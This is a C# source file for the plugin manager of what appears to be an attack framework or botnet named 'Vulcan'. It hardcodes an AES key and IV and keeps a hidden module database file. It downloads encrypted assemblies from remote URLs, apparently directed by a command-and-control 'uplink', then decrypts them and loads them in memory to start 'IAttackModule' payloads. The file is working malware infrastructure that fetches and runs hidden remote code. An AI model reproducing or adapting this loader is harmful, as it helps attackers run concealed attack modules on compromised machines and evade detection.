using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using Vulcan.Core.Config;

namespace Vulcan.Core.PluginFramework
{
    public class VulcanPluginManager
    {
        private static readonly byte[] aesKey = new byte[] { 0x3d, 0x70, 0x47, 0x5e, 0x07, 0x6e, 0x4b, 0x6f, 0xec, 0x66, 0xea, 
            0x11, 0x07, 0x1a, 0xa9, 0xc7, 0x54, 0x30, 0x5c, 0x4d, 0xca, 0x62, 0x75, 0xa2, 0x71, 0x58, 0x91, 0x8f, 0x2b,
            0x68, 0xb6, 0x36 };

        private static readonly byte[] aesIV = new byte[]{0xba, 0xa2, 0x2e, 0xdf, 0x2d, 0x5b, 0xe0, 0x55, 0x5d, 0xc2, 0x51,
            0xa5, 0x96, 0x20, 0xa3, 0x04};

        private Dictionary<string, PluginInformation> plugins = new Dictionary<string, PluginInformation>();
        private IList<IAttackModule> loadedModules = new List<IAttackModule>();

        internal VulcanDb Database
        {
            private set;
            get;
        }

        internal void Init()
        {
            this.Database = new VulcanDb();

            if (!File.Exists(".VLCNMODDB"))
            {
                CreatePluginDatabase();
                Database.EncodeInto(File.Create(".VLCNMODDB"));
                Database.DecodeInto(File.Open(".VLCNMODDB", FileMode.Open));
            }
            else
            {
                Database = new VulcanDb();
                Database.DecodeInto(File.Open(".VLCNMODDB", FileMode.Open));
            }

            DbTable table = Database.SelectTable("modules");

            DbQuery query = new DbQuery();
            query.AddFilter("enabled", true);

            foreach(DbRow row in table.Query(query))
            {
                this.AddPlugin((string)row["name"].ToString(), new PluginInformation((string)row["name"],
                    (string)row["location"],
                    (string)row["hash"],
                    (bool)row["enabled"],
                    true));
            }

            VulcanConfiguration.Instance.PrimaryUplink.UpdatePlugins(this);

            table.Truncate();

            foreach(PluginInformation info in this.plugins.Values)
            {
                if (info.Persistent)
                {
                    DbRow row = table.InsertRow();
                    row["name"] = info.Name;
                    row["enabled"] = info.Enabled;
                    row["hash"] = info.Hash;
                    row["location"] = info.FilePath;
                }
            }

            Database.EncodeInto(File.Open(".VLCNMODDB", FileMode.OpenOrCreate));
        }

        internal void LoadAll()
        {
            foreach(string name in plugins.Keys)
            {
                PluginInformation info = plugins[name];
                if(info.Enabled)
                {
                    if (info.Persistent)
                        Load(info.FilePath);
                    else
                        LoadRemote(info.FilePath);
                    Console.WriteLine("Load Pluggin {0}", name);
                }
            }
            Console.Out.Flush();
        }

        internal void CreatePluginDatabase()
        {
            DbTable table = this.Database.CreateTable("modules");
            table.AddColumn("name", DbType.String);
            table.AddColumn("location", DbType.String);
            table.AddColumn("enabled", DbType.Boolean);
            table.AddColumn("hash", DbType.String);
        }

        internal bool UpdatePlugins()
        {
            bool update = false;

            return update;
        }

        internal void AddPlugin(string name, PluginInformation info)
        {
            this.plugins[name] = info;
        }

        public void Load(string path)
        {
            try
            {
                Console.WriteLine("Load Plugin: {0}", path);
                Assembly asm = null;

                using (MemoryStream ostream = new MemoryStream())
                {
                    DecryptAssembly(File.ReadAllBytes(path), ostream);
                    asm = Assembly.Load(ostream.ToArray());
                }

                foreach (Type t in asm.GetTypes())
                {
                    if (t.GetInterface(typeof(IAttackModule).FullName) != null)
                    {
                        IAttackModule module = (IAttackModule)t.GetConstructor(new Type[] { }).Invoke(new object[] { });
                        module.InitModule(VulcanConfiguration.Instance);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Fail: {0}", ex.ToString());
                Console.Out.Flush();
            }
        }

        public void LoadRemote(string url)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    Assembly asm = null;

                    using (MemoryStream ostream = new MemoryStream())
                    {
                        DecryptAssembly(client.DownloadData(url), ostream);
                        asm = Assembly.Load(ostream.ToArray());
                    }

                    foreach (Type t in asm.GetTypes())
                    {
                        if (t.GetInterface(typeof(IAttackModule).FullName) != null)
                        {
                            IAttackModule module = (IAttackModule)t.GetConstructor(new Type[] { }).Invoke(new object[] { });
                            module.InitModule(VulcanConfiguration.Instance);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Fail: {0}", ex.ToString());
                Console.Out.Flush();
            }
        }

        private static void DecryptAssembly(byte[] original, MemoryStream ostream)
        {
            using (AesManaged decrypt = new AesManaged())
            {
                decrypt.IV = aesIV;
                decrypt.Key = aesKey;
                decrypt.Padding = PaddingMode.None;

                using (MemoryStream instream = new MemoryStream(original))
                {
                    using (CryptoStream cs = new CryptoStream(instream, decrypt.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        decrypt.KeySize = 256;
                        decrypt.BlockSize = 128;
                        int dat = 0;

                        while ((dat = cs.ReadByte()) != -1)
                        {
                            ostream.WriteByte((byte)dat);
                        }
                    }
                }
            }
        }
    }
}
